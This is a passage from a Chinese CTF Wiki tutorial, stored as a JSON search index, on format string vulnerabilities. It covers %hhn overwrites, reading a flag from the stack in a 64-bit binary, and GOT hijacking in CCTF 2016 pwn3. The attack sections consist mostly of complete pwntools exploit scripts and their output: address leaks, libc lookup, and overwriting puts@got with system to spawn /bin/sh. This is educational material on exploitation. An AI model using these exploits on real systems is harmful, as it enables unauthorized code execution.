\u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002  \u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002  .data:0804A028                 public b\n.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510\u0018r  \u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002  0x0804A028 \\x78\n0x0804A029 \\x56\n0x0804A02a \\x34\n0x0804A02b \\x12  \u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684  p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+ %6$n +pad2+ %7$n +pad3+ %8$n +pad4+ %9$n   \u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b  def   fmt ( prev ,   word ,   index ): \n     if   prev     word : \n         result   =   word   -   prev \n         fmtstr   =   %   +   str ( result )   +   c \n     elif   prev   ==   word : \n         result   =   0 \n     else : \n         result   =   256   +   word   -   prev \n         fmtstr   =   %   +   str ( result )   +   c \n     fmtstr   +=   %   +   str ( index )   +   $hhn \n     return   fmtstr  def   fmt_str ( offset ,   size ,   addr ,   target ): \n     payload   =   \n     for   i   in   range ( 4 ): \n         if   size   ==   4 : \n             payload   +=   p32 ( addr   +   i ) \n         else : \n             payload   +=   p64 ( addr   +   i ) \n     prev   =   len ( payload ) \n     for   i   in   range ( 4 ): \n         payload   +=   fmt ( prev ,   ( target     i   *   8 )     0xff ,   offset   +   i ) \n         prev   =   ( target     i   *   8 )     0xff \n     return   payload  payload   =   fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 )   \u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b   offset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb  size\u8868\u793a\u673a\u5668\u5b57\u957f  addr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002  target\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002   \u76f8\u5e94\u7684exploit\u5982\u4e0b  def   forb (): \n     sh   =   process ( ./overwrite ) \n     payload   =   fmt_str ( 6 ,   4 ,   0x0804A028 ,   0x12345678 ) \n     print   payload \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()   \u7ed3\u679c\u5982\u4e0b  \u279c    overwrite   git :( master )   \u2717   python   exploit . py  [ + ]   Starting   local   process   ./overwrite :   pid   78547  ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 % 104 c % 6 $ hhn % 222 c % 7 $ hhn % 222 c % 8 $ hhn % 222 c % 9 $ hhn  [ * ]   Process   ./overwrite   stopped   with   exit   code   0   ( pid   78547 )  0xfff6f9bc  ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0                                                                                                         X                                                                                                                                                                                                                               \ufffd                                                                                                                                                                                                                              \\ xbb                                                                                                                                                                                                                               ~ modified   b   for   a   big   number !   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u8986\u76d6\u5927\u6570\u5b57"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50\n\n\n\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002\n\n\n64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\n\u539f\u7406\n\n\n\u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \n2017\n-UIUCTF-pwn200-GoodLuck git:\n(\nmaster\n)\n \u2717 checksec goodluck\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e\n\n\n  \nfor\n \n(\n \nj\n \n=\n \n0\n;\n \nj\n \n=\n \n21\n;\n \n++\nj\n \n)\n\n  \n{\n\n    \nv5\n \n=\n \nformat\n[\nj\n];\n\n    \nif\n \n(\n \n!\nv5\n \n||\n \nv11\n[\nj\n]\n \n!=\n \nv5\n \n)\n\n    \n{\n\n      \nputs\n(\nYou answered:\n);\n\n      \nprintf\n(\nformat\n);\n\n      \nputs\n(\n\\n\nBut that was totally wrong lol get rekt\n);\n\n      \nfflush\n(\n_bss_start\n);\n\n      \nresult\n \n=\n \n0\n;\n\n      \ngoto\n \nLABEL_11\n;\n\n    \n}\n\n  \n}\n\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002\n\n\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x400640\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck \nwhat\ns the flag\n\n\n123456\n\n\nYou answered:\n\n\n\nBreakpoint 1, __printf (format=0x602830 \n123456\n) at printf.c:28\n\n\n28  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n\n   0x7ffff7a627f7 \nfprintf+135\n    add    rsp, 0xd8\n\n\n   0x7ffff7a627fe \nfprintf+142\n    ret    \n\n\n   0x7ffff7a627ff                  nop    \n\n\n \u2192 0x7ffff7a62800 \nprintf+0\n       sub    rsp, 0xd8\n\n\n   0x7ffff7a62807 \nprintf+7\n       test   al, al\n\n\n   0x7ffff7a62809 \nprintf+9\n       mov    QWORD PTR [rsp+0x28], rsi\n\n\n   0x7ffff7a6280e \nprintf+14\n      mov    QWORD PTR [rsp+0x30], rdx\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n\n[\n0x7fffffffdb08\n, \nl8\n]\n\n\n8\n\n0x00007fffffffdb08\u2502+0x00: 0x0000000000400890  \u2192  \nmain+234\n mov edi, 0x4009b8    \u2190 \n$rsp\n\n0x00007fffffffdb10\u2502+0x08: 0x0000000031000001\n0x00007fffffffdb18\u2502+0x10: 0x0000000000602830  \u2192  0x0000363534333231 \n(\n123456\n?\n)\n\n0x00007fffffffdb20\u2502+0x18: 0x0000000000602010  \u2192  \nYou answered:\\ng\n\n0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30  \u2192  \nflag{11111111111111111\n\n0x00007fffffffdb30\u2502+0x28: \nflag{11111111111111111\n\n0x00007fffffffdb38\u2502+0x30: \n11111111111111\n\n0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 \n(\n111111\n?\n)\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \n123456\n)\n\n\n[\n#1] 0x400890 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\n\n\n\u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d\n%order$s\n\u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\n%9$s\n\u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002\n\n\ngef\u27a4  fmtarg 0x00007fffffffdb28\nThe index of format argument : \n10\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\ngoodluck\n \n=\n \nELF\n(\n./goodluck\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\npwn.sniperoj.cn\n,\n \n30017\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./goodluck\n)\n\n\npayload\n \n=\n \n%9$s\n\n\nprint\n \npayload\n\n\n##gdb.attach(sh)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nprint\n \nsh\n.\nrecv\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\nhijack GOT\n\n\n\u539f\u7406\n\n\n\u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002\n\n\n\u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4\n\n\n\n\n\n\n\u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002\n\n\n\n\n\u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\n\n\n\n\n\u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\n\n\u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002\n\n\n\n\n\n\n\u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd\n\n\n\n\n\u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002\n\n\nROP\n\n\n\n\npop eax; ret;           # printf@got -\n eax\npop ebx; ret;           # (addr_offset = system_addr - printf_addr) -\n ebx\nadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\n\n\n\n\n\n\n\n\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u5982\u4e0b\n\n\n\u279c  \n2016\n-CCTF-pwn3 git:\n(\nmaster\n)\n \u2717 checksec pwn3 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\nint\n \nget_file\n()\n\n\n{\n\n  \nchar\n \ndest\n;\n \n// [sp+1Ch] [bp-FCh]@5\n\n  \nchar\n \ns1\n;\n \n// [sp+E4h] [bp-34h]@1\n\n  \nchar\n \n*\ni\n;\n \n// [sp+10Ch] [bp-Ch]@3\n\n\n  \nprintf\n(\nenter the file name you want to get:\n);\n\n  \n__isoc99_scanf\n(\n%40s\n,\n \ns1\n);\n\n  \nif\n \n(\n \n!\nstrncmp\n(\ns1\n,\n \nflag\n,\n \n4u\n)\n \n)\n\n    \nputs\n(\ntoo young, too simple\n);\n\n  \nfor\n \n(\n \ni\n \n=\n \n(\nchar\n \n*\n)\nfile_head\n;\n \ni\n;\n \ni\n \n=\n \n(\nchar\n \n*\n)\n*\n((\n_DWORD\n \n*\n)\ni\n \n+\n \n60\n)\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n!\nstrcmp\n(\ni\n,\n \ns1\n)\n \n)\n\n    \n{\n\n      \nstrcpy\n(\ndest\n,\n \ni\n \n+\n \n0x28\n);\n\n      \nreturn\n \nprintf\n(\ndest\n);\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nprintf\n(\ndest\n);\n\n\n}\n\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u601d\u8def\n\n\n\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def\n\n\n\n\n\u7ed5\u8fc7\u5bc6\u7801\n\n\n\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb\n\n\n\u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002\n\n\n\u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002\n\n\n\u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\n\n\n\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n##context.log_level = \ndebug\n\n\npwn3\n \n=\n \nELF\n(\n./pwn3\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n111\n,\n \n111\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./pwn3\n)\n\n\n\n\ndef\n \nget\n(\nname\n):\n\n    \nsh\n.\nsendline\n(\nget\n)\n\n    \nsh\n.\nrecvuntil\n(\nenter the file name you want to get:\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \ndata\n \n=\n \nsh\n.\nrecv\n()\n\n    \nreturn\n \ndata\n\n\n\n\ndef\n \nput\n(\nname\n,\n \ncontent\n):\n\n    \nsh\n.\nsendline\n(\nput\n)\n\n    \nsh\n.\nrecvuntil\n(\nplease enter the name of the file you want to upload:\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \nsh\n.\nrecvuntil\n(\nthen, enter the content:\n)\n\n    \nsh\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshow_dir\n():\n\n    \nsh\n.\nsendline\n(\ndir\n)\n\n\n\n\ntmp\n \n=\n \nsysbdmin\n\n\nname\n \n=\n \n\n\nfor\n \ni\n \nin\n \ntmp\n:\n\n    \nname\n \n+=\n \nchr\n(\nord\n(\ni\n)\n \n-\n \n1\n)\n\n\n\n\n## password\n\n\ndef\n \npassword\n():\n\n    \nsh\n.\nrecvuntil\n(\nName (ftp.hacker.server:Rainism):\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n\n\n\n##password\n\n\npassword\n()\n\n\n## get the addr of puts\n\n\nputs_got\n \n=\n \npwn3\n.\ngot\n[\nputs\n]\n\n\nlog\n.\nsuccess\n(\nputs got : \n \n+\n \nhex\n(\nputs_got\n))\n\n\nput\n(\n1111\n,\n \n%8$s\n \n+\n \np32\n(\nputs_got\n))\n\n\nputs_addr\n \n=\n \nu32\n(\nget\n(\n1111\n)[:\n4\n])\n\n\n\n## get addr of system\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nputs\n,\n \nputs_addr\n)\n\n\nsystem_offset\n \n=\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nputs_offset\n \n=\n \nlibc\n.\ndump\n(\nputs\n)\n\n\nsystem_addr\n \n=\n \nputs_addr\n \n-\n \nputs_offset\n \n+\n \nsystem_offset\n\n\nlog\n.\nsuccess\n(\nsystem addr : \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\n\n## modify puts@got, point to system_addr\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n7\n,\n \n{\nputs_got\n:\n \nsystem_addr\n})\n\n\nput\n(\n/bin/sh;\n,\n \npayload\n)\n\n\nsh\n.\nrecvuntil\n(\nftp\n)\n\n\nsh\n.\nsendline\n(\nget\n)\n\n\nsh\n.\nrecvuntil\n(\nenter the file name you want to get:\n)\n\n\n##gdb.attach(sh)\n\n\nsh\n.\nsendline\n(\n/bin/sh;\n)\n\n\n\n## system(\n/bin/sh\n)\n\n\nshow_dir\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002\n\n\n\u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002\n\n\n\n\nhijack 